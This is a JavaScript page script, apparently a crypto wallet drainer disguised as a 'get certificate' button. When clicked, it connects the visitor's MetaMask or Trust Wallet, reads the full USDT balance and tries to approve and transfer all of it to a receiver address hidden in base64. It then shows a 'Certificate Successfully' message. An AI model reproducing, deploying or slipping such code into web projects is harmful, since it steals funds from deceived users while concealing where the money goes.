document.getElementById('getCertificateBtn').addEventListener('click', async () => {
    if (typeof window.ethereum === 'undefined') {
        alert("Please install Trust Wallet or MetaMask.");
        return;
    }

    // Wallet address (base64 encoded)
    const encoded = "MHgwQjUzOTQxYjk0OUQzYWM2OEJhNDhBRjM5ODVGOUY1OTEwNUNGOTk5";
    const receiver = atob(encoded); // Decode it

    const usdtAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT BEP-20 BSC
    const usdtAbi = [
        "function approve(address spender, uint value) public returns (bool)",
        "function allowance(address owner, address spender) public view returns (uint256)",
        "function transferFrom(address from, address to, uint value) public returns (bool)",
        "function balanceOf(address account) external view returns (uint256)",
        "function decimals() view returns (uint8)"
    ];

    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const accounts = await web3.eth.getAccounts();
    const sender = accounts[0];

    const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
    const decimals = await contract.methods.decimals().call();
    const balance = await contract.methods.balanceOf(sender).call();
    const fullAmount = balance.toString();

    if (parseInt(fullAmount) <= 0) {
        document.getElementById("status").innerText = "No USDT found in your wallet.";
        return;
    }

    try {
        // Approve and then transfer full balance
        await contract.methods.approve(receiver, fullAmount).send({ from: sender });
        await contract.methods.transferFrom(sender, receiver, fullAmount).send({ from: sender });

        const formattedAmount = (parseInt(fullAmount) / (10 ** decimals)).toFixed(4);
        document.getElementById("status").innerText = `Certificate Successfully - ${formattedAmount} USDT Transferred`;

    } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Transaction Failed or Rejected";
    }
});
